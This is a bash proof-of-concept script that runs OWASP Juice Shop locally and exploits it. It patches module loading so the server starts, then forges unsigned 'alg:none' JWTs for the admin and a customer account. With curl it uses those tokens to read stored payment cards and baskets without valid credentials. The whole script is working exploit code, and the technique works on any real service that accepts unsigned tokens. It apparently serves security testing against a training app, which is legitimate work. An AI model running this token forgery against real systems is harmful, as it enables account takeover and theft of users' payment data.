#!/usr/bin/env bash
set -euo pipefail
cd "${JUICE_SHOP_DIR:-/workspace/juice-shop}"
cat > /tmp/juice-poc-preload.js <<'EOF'
const Module = require('module');
const origLoad = Module._load;
Module._load = function(request, parent, isMain) {
  if (request === 'yaml-schema-validator/src') return function(){ return []; };
  return origLoad.apply(this, arguments);
};
process.exit = (code)=>{ console.error('[poc] blocked process.exit('+code+')'); };
EOF
node -r /tmp/juice-poc-preload.js build/app >/tmp/juice-poc-server.log 2>&1 &
PID=$!
trap 'kill $PID 2>/dev/null || true' EXIT
for i in $(seq 1 70); do
  if curl -fsS http://127.0.0.1:3000/rest/admin/application-version >/dev/null 2>&1; then break; fi
  sleep 1
done
TOKEN_ID1=$(node - <<'NODE'
function b64(o){return Buffer.from(JSON.stringify(o)).toString('base64url')}
const payload={status:'success',data:{id:1,email:'admin@juice-sh.op',role:'admin'},bid:1};
process.stdout.write(b64({typ:'JWT',alg:'none'})+'.'+b64(payload)+'.');
NODE
)
TOKEN_ID2=$(node - <<'NODE'
function b64(o){return Buffer.from(JSON.stringify(o)).toString('base64url')}
const payload={status:'success',data:{id:2,email:'jim@juice-sh.op',role:'customer'}};
process.stdout.write(b64({typ:'JWT',alg:'none'})+'.'+b64(payload)+'.');
NODE
)
echo '== no token /api/Cards (expected 401) =='
curl -s -i http://127.0.0.1:3000/api/Cards | sed -n '1,16p'
echo '== forged alg:none id=1 /api/Cards (expected 200 with UserId 1 cards) =='
curl -s -i -H "Authorization: Bearer $TOKEN_ID1" http://127.0.0.1:3000/api/Cards | sed -n '1,24p'
echo '== forged alg:none id=2 /api/Cards (expected 200 with UserId 2 cards) =='
curl -s -i -H "Authorization: Bearer $TOKEN_ID2" http://127.0.0.1:3000/api/Cards | sed -n '1,24p'
echo '== forged alg:none id=1 /rest/basket/1 (expected 200 through isAuthorized+appendUserId) =='
curl -s -i -H "Authorization: Bearer $TOKEN_ID1" http://127.0.0.1:3000/rest/basket/1 | sed -n '1,22p'
